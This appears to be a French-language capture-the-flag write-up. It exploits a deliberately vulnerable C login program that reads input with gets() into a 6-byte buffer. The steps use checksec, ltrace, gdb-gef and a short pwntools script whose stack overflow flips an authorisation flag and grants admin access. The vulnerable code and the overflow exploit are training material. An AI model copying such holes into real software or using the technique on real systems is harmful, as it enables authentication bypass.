Ici on a un `login.c` qu'on va compiler


```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0)
    {
        printf("Correct Password!\n");
        authorised = 1;
    }
    else
    {
        printf("Incorrect Password!\n");
    }

    if(authorised)
    {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}

```

### Analysons
Ce program initie une variable char avec un maximum de `6` caracteres.
Ensuite initie une variable `authorised` a 	`0`. Puis demande d'entrer un mot de passe. si tu entre `pass` c'est correct et tu sera logged en tant que admin. sino non tu seras pas logged.

```sh
# checksec --file=login 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.11/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.11.1 --> 4.12.0).
    Update with: $ pip install -U pwntools
[*] '/home/blo/CTFs/Jeopardy/Pwn/login'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Je vais lancer `ltrace` sur ce programme.

```sh
─# ltrace ./login 
__libc_start_main(0x80490ad, 1, 0xffa6efd4, 0 <unfinished ...>
puts("Enter admin password: "Enter admin password: 
)                   = 23
gets(0xffa6eef6, 0, 19, 0x80491adaaa
)               = 0xffa6eef6
strcmp("aaa", "pass")                            = -1
puts("Incorrect Password!"Incorrect Password!
)                      = 20
printf("Failed to log in as Admin (autho"..., 0Failed to log in as Admin (authorised=0) :(
) = 44
+++ exited (status 0) +++
```
 Dans cet output, lorsque je rentre un mot de passe quelconque. je recois une comparaison de mon string et le `pass` qui est le vrai mot de passe

- *GDB-gef*

```sh
gef➤  file login
Reading symbols from login...
(No debugging symbols found in login)
gef➤  info functions 
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  strcmp@plt
0x08049040  __libc_start_main@plt
0x08049050  printf@plt
0x08049060  gets@plt
0x08049070  puts@plt
0x08049080  _start
0x080490ad  __wrap_main
0x080490c0  _dl_relocate_static_pie
0x080490d0  __x86.get_pc_thunk.bx
0x080490e0  deregister_tm_clones
0x08049120  register_tm_clones
0x08049160  __do_global_dtors_aux
0x08049190  frame_dummy
0x08049196  main
0x08049264  _fini
gef➤  
```

Ok on peux dissasemble la functionns `main`

```sh

0x080491e9 <+83>:    call   0x8049030 <strcmp@plt>
   0x080491ee <+88>:    add    esp,0x10
   0x080491f1 <+91>:    test   eax,eax
   0x080491f3 <+93>:    jne    0x8049210 <main+122>
   0x080491f5 <+95>:    sub    esp,0xc
   0x080491f8 <+98>:    lea    eax,[ebx-0x1fd0]
   0x080491fe <+104>:   push   eax
   0x080491ff <+105>:   call   0x8049070 <puts@plt>
   0x08049204 <+110>:   add    esp,0x10
   0x08049207 <+113>:   mov    DWORD PTR [ebp-0xc],0x1
   0x0804920e <+120>:   jmp    0x8049222 <main+140>
   0x08049210 <+122>:   sub    esp,0xc
   0x08049213 <+125>:   lea    eax,[ebx-0x1fbe]
   0x08049219 <+131>:   push   eax
   0x0804921a <+132>:   call   0x8049070 <puts@plt>
   0x0804921f <+137>:   add    esp,0x10
   0x08049222 <+140>:   cmp    DWORD PTR [ebp-0xc],0x0
   0x08049226 <+144>:   je     0x804923f <main+169>
   0x08049228 <+146>:   sub    esp,0x8
   0x0804922b <+149>:   push   DWORD PTR [ebp-0xc]
   0x0804922e <+152>:   lea    eax,[ebx-0x1fa8]
   0x08049234 <+158>:   push   eax
   0x08049235 <+159>:   call   0x8049050 <printf@plt>
   0x0804923a <+164>:   add    esp,0x10
   0x0804923d <+167>:   jmp    0x8049254 <main+190>


```

c'est comme le code deja vue sur ghidra alors.
j'appercois ici une comparaison `0x08049222 <+140>:   cmp    DWORD PTR [ebp-0xc],0x0`

Je vais y mettre un breakpoint ici et lancer le programme

```sh
gef➤  b *main+140
Breakpoint 1 at 0x8049222
gef➤  run
Starting program: /home/blo/CTFs/Jeopardy/Pwn/login 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter admin password: 
aa
Incorrect Password!

Breakpoint 1, 0x08049222 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049219 <main+131>       push   eax
    0x804921a <main+132>       call   0x8049070 <puts@plt>
    0x804921f <main+137>       add    esp, 0x10
 →  0x8049222 <main+140>       cmp    DWORD PTR [ebp-0xc], 0x0
    0x8049226 <main+144>       je     0x804923f <main+169>
    0x8049228 <main+146>       sub    esp, 0x8
    0x804922b <main+149>       push   DWORD PTR [ebp-0xc]
    0x804922e <main+152>       lea    eax, [ebx-0x1fa8]
    0x8049234 <main+158>       push   eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "login", stopped 0x8049222 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────

```

Dans cet output on voit que le `cmp` compare la variable a 0x0 qui est `0`. si c'est pas le cas de continuer le code
affichons la valeur du variable du variable
```sh
gef➤  x $ebp - 0xc
0xffffd29c:     0x00000000
```

Tous des 0000, alors et si je la modifie avec `set`

```sh
gef➤  set *0xffffd29c = 1
gef➤  x $ebp - 0xc
0xffffd29c:     0x00000001
gef➤  
```
Ici on constate bien un changement des 0 a 1, et si nous continuons on aura alors une autorisation dans le script

```c
gef➤  c
Continuing.
Successfully logged in as Admin (authorised=1) :)
[Inferior 1 (process 207821) exited normally]
gef➤ 
```

Ici il faut savoir que je viens de modifier une variable local du program. dans ce ligne 

```c
    char password[6];
    int authorised = 0;
```
On sait qu'ici si la valeur de authorized est egal a 1
```c
        printf("Correct Password!\n");
        authorised = 1;
```

Now i will create a pwntools script to do that automatically

```
#!/usr/bin/python3


from pwn import *

p = process("./login")
p.sendlineafter(b'Enter admin password:', b'AAAAAAAAAAA')
var2 = p.recvall().decode()
print(var2)


p.close()

```

et quand je l'execute

```sh
└─# python3 exp_login.py
[+] Starting local process './login': pid 223294
[+] Receiving all data: Done (81B)
[*] Process './login' stopped with exit code -11 (SIGSEGV) (pid 223294)
 
Incorrect Password!
Successfully logged in as Admin (authorised=1094795585) :)
```